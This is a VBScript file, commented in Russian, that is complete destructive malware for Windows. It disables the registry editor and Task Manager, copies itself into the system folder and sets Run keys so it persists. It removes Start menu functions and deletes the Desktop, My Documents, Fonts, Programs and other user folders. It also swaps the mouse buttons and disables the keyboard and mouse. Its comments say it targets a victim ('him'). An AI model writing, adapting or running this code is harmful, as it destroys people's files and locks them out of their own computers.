Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")


' Блокировать RegEdit(чтоб у него не заводился редактор реестра).Для того чтобы разблокировать происвойте DisableRegistryTools значение - 0
Shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"


' Запускаться при каждой перезагрузке
Set File2 = FileSystemObject.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

' Удаление пунктов меню Пуск: Программы, Завершение работы, Найти, Выполнить, Документы и т.д.
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoStartMenuMorePrograms", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoClose", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoFind", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoRun", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoRecentDocsMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoFavoritesMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoStartMenuLogoff", 1, "REG_DWORD"

Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoClose", 1, "REG_DWORD"

'     Удаление специальных папок
 For Each Folder In Shell.SpecialFolders

' Удаление Рабочего стола
 FileSystemObject.deletefolder Shell.SpecialFolders ("Desktop"),True
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"

' Удаление Aplication Data
 If right(folder,15) = "Aplication Data" Then FileSystemObject.deletefolder folder,True

' Удаление PrintHood
 If  right(folder,9) = "PrintHood"  Then FileSystemObject.deletefolder folder,True

' Удаление ShellNew
 If right(folder,8) = "ShellNew" Then FileSystemObject.deletefolder folder,True

' Удаление шрифтов
 If right(folder,5) = "FONTS" Then FileSystemObject.deletefolder folder,True

' Удаление NetHood
 If right(folder,7) = "NetHood" Then FileSystemObject.deletefolder folder,True

' Удаление Главное меню
 If right(folder,12) = "Главное меню" Then FileSystemObject.deletefolder folder,True

' Удаление SendTo
 If right(folder,6) = "SendTo" Then FileSystemObject.deletefolder folder,True

' Удаление Автозагрузка
 If right(folder,12) = "Автозагрузка" Then FileSystemObject.deletefolder folder,True

' Удаление Избранное
 If right(folder,9) = "Избранное" Then FileSystemObject.deletefolder folder,True

' Удаление Мои документы
 If right(folder,13) = "Мои документы" Then FileSystemObject.deletefolder folder,True

' Удаление Программы
 If right(folder,9) = "Программы" Then FileSystemObject.deletefolder folder,True
 Next

Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SwapNT", "rundll32 user32, SwapMouseButton"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Swap98", "rundll32.exe user.exe, swapmousebutton"
Shell.Run "rundll32 user32, SwapMouseButton"

'     Вырубить клавиатуру(Только для Windows 95,98,Me)
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Dead", "rundll32 keyboard,disable"
Shell.Run "rundll32.exe keyboard.exe, disable"

'     Отключить мышь(Только для Windows 95,98,Me)
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Mad", "rundll32 mouse,disable"
Shell.Run "rundll32.exe mouse.exe, disable"


